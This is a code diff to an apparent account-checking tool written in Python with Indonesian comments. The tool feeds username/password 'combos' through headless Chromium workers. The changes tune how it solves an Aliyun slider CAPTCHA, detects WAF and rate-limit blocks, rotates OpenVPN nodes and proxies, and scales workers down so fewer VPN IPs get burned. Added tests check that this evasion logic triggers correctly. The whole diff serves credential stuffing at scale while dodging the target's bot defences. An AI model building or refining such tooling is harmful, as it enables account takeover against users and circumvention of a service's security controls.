@@ -769,26 +769,27 @@ class SmartController:
         if (t - self.last_action_t) < (4.0 if ram_crit else 6.0):
             return 'NONE', {}
 
-        # 2. Tekanan RAM kritis atau kontensi LOCK berat -> turunkan worker bertahap
+        # 2. Tekanan RAM, kontensi LOCK, atau WAF burst di 1-IP VPN -> turunkan worker bertahap dulu sebelum rotasi VPN
         lock_heavy = (tag == 'LOCK' and is_drop and lock_r >= 0.40) or (lock_r >= 0.55 and is_drop)
-        if (ram_crit or lock_heavy) and self.target_workers > self.min_workers and (t - self.last_scale_t) >= (10.0 if ram_crit else 18.0):
+        waf_heavy = can_rotate_vpn and n_out >= 10 and waf_r >= 0.35 and self.target_workers > max(self.min_workers, 6)
+        if (ram_crit or lock_heavy or waf_heavy) and self.target_workers > self.min_workers and (t - self.last_scale_t) >= (10.0 if ram_crit else 18.0):
             step = max(1, self.target_workers // 4)
             new_w = max(self.min_workers, self.target_workers - step)
-            why = f"RAM {int(avail_mb)}MB" if ram_crit else f"LOCK {int(lock_r*100)}%"
+            why = f"RAM {int(avail_mb)}MB" if ram_crit else (f"LOCK {int(lock_r*100)}%" if lock_heavy else f"WAF {int(waf_r*100)}%")
             return 'SCALE_DOWN', {'new_w': new_w, 'reason': why}
 
         if not is_recycling and (
             (tag == 'LOCK' and is_drop and (t - self.last_heal_t) >= 25.0)
-            or (ctx_age >= max(240, self.target_workers * 22) and (t - self.last_heal_t) >= 35.0)
+            or (ctx_age >= max(400, self.target_workers * 35) and (t - self.last_heal_t) >= 45.0)
         ):
             if (t - self.pause_until_t) >= 8.0:
                 self.probe_active = None
                 self.scale_up_cooldown_t = max(self.scale_up_cooldown_t, t + 25.0)
                 return 'RECYCLE_BROWSER', {'cur_r': cur_r, 'peak_r': peak_r, 'reason': tag if is_drop else 'ctx_age'}
 
-        # 3. Degradasi VPN / WAF / Timeout -> rotasi VPN
-        if can_rotate_vpn and (t - self.pause_until_t) >= 8.0 and (t - self.last_heal_t) >= 28.0:
-            bad_stat = (n_out >= 10 and (waf_r + tmo_r) >= 0.50)
+        # 3. Degradasi VPN / WAF berat setelah cukup sampel -> rotasi VPN (hindari rotasi tiap 40s)
+        if can_rotate_vpn and (t - self.pause_until_t) >= 22.0 and (t - self.last_heal_t) >= 45.0:
+            bad_stat = (n_out >= 16 and (waf_r + tmo_r) >= 0.65)
             heal_drop, _, _, _ = self.should_auto_heal(t)
             if bad_stat or (heal_drop and tag != 'LOCK'):
                 why = f"WAF/TMO {int((waf_r+tmo_r)*100)}%" if bad_stat else f"{cur_r:.2f}/{peak_r:.2f}/s ({tag})"
@@ -2133,7 +2134,7 @@ async def _solve_waf_impl(page, ctx) -> bool:
         return True
 
     box = None
-    for _ in range(40):  # ponytail: up to 8.0s for Aliyun nc.js + feilin bundle to mount over proxy
+    for _ in range(25):  # hingga 5.0s tunggu slider Aliyun ter-mount
         try:
             box = await page.evaluate(_SLIDER_BOX_JS)
         except Exception:
@@ -2144,8 +2145,8 @@ async def _solve_waf_impl(page, ctx) -> bool:
     if not box:
         return False
 
-    # Coba hingga 3x dengan re-measure box + variasi jarak ±5%
-    for mult in (1.0, 0.95, 1.05):
+    # Coba hingga 2x dengan re-measure box agar cepat fail-over saat IP kotor
+    for mult in (1.0, 0.96):
         if mult != 1.0:
             try:
                 box = await page.evaluate(_SLIDER_BOX_JS) or box
@@ -2332,7 +2333,7 @@ class VpnCoordinator:
             elif not os.path.isfile(self.ovpn_auth):
                 raise RuntimeError(f"File auth OpenVPN tidak ditemukan: {self.ovpn_auth}")
         self.consec_waf_rate = 0
-        self._recent_outcomes: deque[bool] = deque(maxlen=12)
+        self._recent_outcomes: deque[bool] = deque(maxlen=18)
         self.epoch = 0
         self.last_rotate_checked = 0
         self.rotations = 0
@@ -3016,7 +3017,7 @@ class VpnCoordinator:
     def _waf_tripped(self) -> bool:
         if self.consec_waf_rate >= self.waf_threshold:
             return True
-        return len(self._recent_outcomes) >= 10 and self._recent_outcomes.count(False) >= 6
+        return len(self._recent_outcomes) >= 14 and self._recent_outcomes.count(False) >= 10
 
     def should_rotate_proactive(self, checked: int) -> bool:
         return self.rotate_every > 0 and (checked - self.last_rotate_checked) >= self.rotate_every
@@ -4087,9 +4088,9 @@ async def run_worker(wid: int, combos: list, combo_q: asyncio.Queue,
                 if vpn_coord.ovpn_failed:
                     return False
             if NUM_CONTEXTS >= 6 and wid > 0 and (ctx_vpn_epoch != vpn_coord.epoch or stats['proxy_ctx'] < NUM_CONTEXTS):
-                await asyncio.sleep(min(1.8, (wid % 12) * 0.14))
+                await asyncio.sleep(min(3.5, (wid % 16) * 0.22))
 
-        _recycle_thresh = max(120, NUM_CONTEXTS * 15)
+        _recycle_chk = max(500, NUM_CONTEXTS * 45)
         if browser_state is not None:
             if not browser_state['gate'].is_set():
                 t_lk = time.monotonic()
@@ -4101,7 +4102,7 @@ async def run_worker(wid: int, combos: list, combo_q: asyncio.Queue,
             elif (
                 ensure_browser
                 and not browser_state['recycling']
-                and (stats['proxy_ctx'] - browser_state['born_ctx']) >= _recycle_thresh
+                and (browser_state.get('force_recycle') or (stats['checked'] - browser_state.get('born_chk', 0)) >= _recycle_chk)
                 and (not wave_limit or stats['checked'] < wave_limit - 15)
             ):
                 browser_state['recycling'] = True
@@ -4124,6 +4125,8 @@ async def run_worker(wid: int, combos: list, combo_q: asyncio.Queue,
                 finally:
                     if did_recycle:
                         browser_state['born_ctx'] = stats['proxy_ctx']
+                        browser_state['born_chk'] = stats['checked']
+                        browser_state['force_recycle'] = False
                     browser_state['recycling'] = False
                     browser_state['gate'].set()
                     _PERF.resume()
@@ -4401,7 +4404,7 @@ async def run_worker(wid: int, combos: list, combo_q: asyncio.Queue,
                 if await open_context_and_page(rotate_ip=(rotate_ip or t > 0)):
                     if await ensure_slider_cleared():
                         return True
-                    if vpn_coord:
+                    if vpn_coord and t >= (max_tries - 1):
                         stats['waf'] += 1
                         await vpn_coord.on_waf_or_rate(seen_ep, 'init_slider', browser_state, stats)
             except Exception:
@@ -4645,7 +4648,7 @@ async def run_worker(wid: int, combos: list, combo_q: asyncio.Queue,
                                 pre_vpn_gen = ctx_gen
                                 if await vpn_coord.coordinate('proactive', seen_vpn_ep, browser_state, stats):
                                     await _recover_ctx(pre_vpn_gen, 'rotate')
-                            elif ctx_accts >= ACCOUNTS_PER_CTX or (browser_state is not None and (browser_state['recycling'] or (stats['proxy_ctx'] - browser_state['born_ctx']) >= max(120, NUM_CONTEXTS * 15))):
+                            elif ctx_accts >= ACCOUNTS_PER_CTX or (browser_state is not None and (browser_state['recycling'] or browser_state.get('force_recycle'))):
                                 await _recover_ctx(my_gen, 'periodic_rotate')
                         break
 
@@ -4729,7 +4732,8 @@ async def run_worker(wid: int, combos: list, combo_q: asyncio.Queue,
                     k_id = _norm_combo_key(u, pw)
                     _acct_retries[k_id] = _acct_retries.get(k_id, 0) + 1
                     _out_kind = 'WAF' if kind in ('WAF', 'RATE') else ('TMO' if err_msg == 'timeout_waiting_response' else 'NET')
-                    _PERF.on_outcome(_out_kind, time.monotonic() - t_try)
+                    if _acct_retries[k_id] == 1:
+                        _PERF.on_outcome(_out_kind, time.monotonic() - t_try)
                     # ponytail: don't double-count full t_try when WAF/proxy wait already recorded its seconds
                     if kind != 'WAF' and err_msg not in ('timeout_waiting_response', 'PROXY_HTTP_ERR', '407_TRAFFIC_EXHAUSTED'):
                         _PERF.record_stall('retry', max(0.5, time.monotonic() - t_try))
@@ -4755,7 +4759,7 @@ async def run_worker(wid: int, combos: list, combo_q: asyncio.Queue,
 
                     if kind == 'WAF':
                         stats['waf'] += 1
-                        did_vpn = await vpn_coord.on_waf_or_rate(seen_vpn_ep, 'WAF', browser_state, stats) if vpn_coord else False
+                        did_vpn = (await vpn_coord.on_waf_or_rate(seen_vpn_ep, 'WAF', browser_state, stats)) if (vpn_coord and _acct_retries[k_id] in (1, 3)) else False
                         waf_mode = 'rotate' if (did_vpn or ctx_accts >= 4 or _acct_retries[k_id] >= 2) else 'waf_refresh'
                         if not await _recover_ctx(my_gen, waf_mode):
                             raise RuntimeError(f"w{wid}_waf_recovery_failed")
@@ -5184,13 +5188,13 @@ async def async_main():
         assert vc._pick_next_ovpn() == 'sg_udp.ovpn'
         vc.consec_waf_rate = 0
         vc._recent_outcomes.clear()
-        for idx_o in range(10):
-            if idx_o in (3, 7):
+        for idx_o in range(16):
+            if idx_o in (3, 7, 11):
                 vc.record_ok()
             else:
                 vc.consec_waf_rate = 0
                 vc._recent_outcomes.append(False)
-        assert vc._waf_tripped(), "Intermittent WAF (80%) must trip rotation even if record_ok resets consec_waf_rate"
+        assert vc._waf_tripped(), "Intermittent WAF (81%) must trip rotation even if record_ok resets consec_waf_rate"
         sd_t = _SpeedDetector()
         sd_t.reset(now_t=100.0)
         for i in range(60):
@@ -5249,6 +5253,14 @@ async def async_main():
         sc.mark_worker_dead(1)
         assert sc.live_workers() == 6 and stats['workers'] == 6
         sc.dead_workers.clear()
+        # High WAF at >6 workers on 1-IP VPN scales down workers BEFORE burning VPN nodes
+        sc_w = SmartController()
+        sc_w.reset(now_t=10.0)
+        sc_w.configure_workers(min_w=2, start_w=12, max_w=12, auto_scale=True, now_t=10.0)
+        for j in range(12):
+            sc_w.on_outcome('WAF' if j < 6 else 'OK', resp_dt=1.5, now_t=40.0 + j * 0.5)
+        act_w, info_w = sc_w.decide_action(avail_mb=3000.0, can_rotate_vpn=True, ctx_age=50, is_recycling=False, now_t=48.0)
+        assert act_w == 'SCALE_DOWN' and info_w['new_w'] < 12, (act_w, info_w)
         # Gate wait_for_slot wakes when target_workers scales up
         await sc.set_target_workers(4, 'DN')
         async def _wake_up():
@@ -5487,7 +5499,7 @@ async def async_main():
                 else:
                     vpn_wait = True
             if ovpn_dir:
-                vpn_waf_threshold = 5
+                vpn_waf_threshold = max(8, min(16, workers))
                 skip_ovpn_test = False
 
     NUM_CONTEXTS = workers
@@ -5579,7 +5591,7 @@ async def async_main():
     p_out(f"{c(CYAN)}[*] Menyiapkan engine browser...{W}")
     browser_ref = [None]
     browser_lock = asyncio.Lock()
-    browser_state = {'born_ctx': 0, 'active': 0, 'recycling': False, 'last_relaunch': 0.0, 'gate': asyncio.Event(), 'zero_evt': asyncio.Event()}
+    browser_state = {'born_ctx': 0, 'born_chk': 0, 'force_recycle': False, 'active': 0, 'recycling': False, 'last_relaunch': 0.0, 'gate': asyncio.Event(), 'zero_evt': asyncio.Event()}
     browser_state['gate'].set()
     browser_state['zero_evt'].set()
     tasks = []
@@ -5653,6 +5665,8 @@ async def async_main():
             p_out(f"{c(GREEN)}[*] {_bmsg} ✓{W}")
         else:
             NUM_CONTEXTS = workers = spawn_w
+        if vpn_coord and vpn_coord.ovpn_files:
+            vpn_coord.waf_threshold = max(vpn_coord.waf_threshold, min(16, max(8, start_w)))
 
         # Proxy testing & assignment
         proxy_assignments = [None] * NUM_CONTEXTS
@@ -5703,7 +5717,7 @@ async def async_main():
                 avail_mb = _hw_now.get('avail_mb', 0.0)
                 _ram_floor = 450.0 if _hw_now.get('no_swap') else 360.0
                 can_rot = vpn_coord is not None and (len(vpn_coord.ovpn_files) > 1 or bool(vpn_coord.vpn_cmd))
-                ctx_age = stats['proxy_ctx'] - browser_state['born_ctx']
+                ctx_age = stats['checked'] - browser_state.get('born_chk', 0)
                 act, info = _PERF.decide_action(avail_mb, can_rot, ctx_age, browser_state['recycling'], ram_floor_mb=_ram_floor)
                 if act == 'NONE':
                     continue
@@ -5726,7 +5740,7 @@ async def async_main():
                     _LIVE_LOGS.append(f" {c(GOLD)}!{W}  {c(GOLD)}SMART HEAL: recycle browser ({h_cur:.2f} vs {h_peak:.2f}/s){W}")
                     if not _TUI_ACTIVE:
                         p_out(f"  {c(GOLD)}[SMART] {info.get('reason', 'LOCK')} -> recycle Chromium...{W}")
-                    browser_state['born_ctx'] = stats['proxy_ctx'] - max(120, NUM_CONTEXTS * 15)
+                    browser_state['force_recycle'] = True
                 elif act == 'ROTATE_VPN' and can_rot:
                     _PERF.last_heal_t = time.monotonic()
                     _PERF.drop_since_t = 0.0
@@ -5848,6 +5862,8 @@ async def async_main():
                 if aborted_on_errors:
                     break
                 browser_state['born_ctx'] = stats['proxy_ctx']
+                browser_state['born_chk'] = stats['checked']
+                browser_state['force_recycle'] = False
                 browser_state['active'] = 0
                 browser_state['recycling'] = False
                 browser_state['gate'].set()
